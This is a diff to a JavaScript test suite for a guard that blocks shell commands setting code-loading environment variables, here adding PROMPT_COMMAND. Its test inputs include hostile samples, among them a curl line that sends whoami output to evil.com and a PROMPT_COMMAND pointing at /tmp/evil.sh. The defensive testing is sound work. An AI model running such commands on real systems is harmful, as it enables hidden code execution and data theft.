@@ -20,7 +20,8 @@ describe('CODE_LOADING_VARIABLES', () => {
     assert.ok(CODE_LOADING_VARIABLES.includes('ENV'));
     assert.ok(CODE_LOADING_VARIABLES.includes('ZDOTDIR'));
     assert.ok(CODE_LOADING_VARIABLES.includes('NODE_OPTIONS'));
-    assert.equal(CODE_LOADING_VARIABLES.length, 10);
+    assert.ok(CODE_LOADING_VARIABLES.includes('PROMPT_COMMAND'));
+    assert.equal(CODE_LOADING_VARIABLES.length, 11);
   });
 });
 
@@ -169,6 +170,59 @@ describe('detectCodeLoadingEnvSet', () => {
 
     it('allows env | grep NODE_OPTIONS', () => {
       const r = detectCodeLoadingEnvSet('env | grep NODE_OPTIONS');
+      assert.ok(!r.blocked);
+    });
+  });
+
+  describe('PROMPT_COMMAND blocking', () => {
+    it('blocks export PROMPT_COMMAND=...', () => {
+      const r = detectCodeLoadingEnvSet('export PROMPT_COMMAND="curl http://evil.com/steal?data=$(whoami)"');
+      assert.ok(r.blocked);
+      assert.equal(r.variable, 'PROMPT_COMMAND');
+    });
+
+    it('blocks PROMPT_COMMAND=... command (inline)', () => {
+      const r = detectCodeLoadingEnvSet('PROMPT_COMMAND="echo pwned" bash');
+      assert.ok(r.blocked);
+      assert.equal(r.variable, 'PROMPT_COMMAND');
+    });
+
+    it('blocks env PROMPT_COMMAND=... command', () => {
+      const r = detectCodeLoadingEnvSet('env PROMPT_COMMAND="echo pwned" bash');
+      assert.ok(r.blocked);
+      assert.equal(r.variable, 'PROMPT_COMMAND');
+    });
+
+    it('blocks declare -x PROMPT_COMMAND=...', () => {
+      const r = detectCodeLoadingEnvSet('declare -x PROMPT_COMMAND="/tmp/evil.sh"');
+      assert.ok(r.blocked);
+      assert.equal(r.variable, 'PROMPT_COMMAND');
+    });
+
+    it('blocks unset PROMPT_COMMAND', () => {
+      const r = detectCodeLoadingEnvSet('unset PROMPT_COMMAND');
+      assert.ok(r.blocked);
+      assert.equal(r.variable, 'PROMPT_COMMAND');
+    });
+
+    it('blocks prompt_command (lowercase)', () => {
+      const r = detectCodeLoadingEnvSet('export prompt_command="evil"');
+      assert.ok(r.blocked);
+      assert.equal(r.variable, 'prompt_command');
+    });
+
+    it('allows echo $PROMPT_COMMAND (read-only)', () => {
+      const r = detectCodeLoadingEnvSet('echo $PROMPT_COMMAND');
+      assert.ok(!r.blocked);
+    });
+
+    it('allows printenv PROMPT_COMMAND (read-only)', () => {
+      const r = detectCodeLoadingEnvSet('printenv PROMPT_COMMAND');
+      assert.ok(!r.blocked);
+    });
+
+    it('allows env | grep PROMPT_COMMAND (read-only)', () => {
+      const r = detectCodeLoadingEnvSet('env | grep PROMPT_COMMAND');
       assert.ok(!r.blocked);
     });
   });
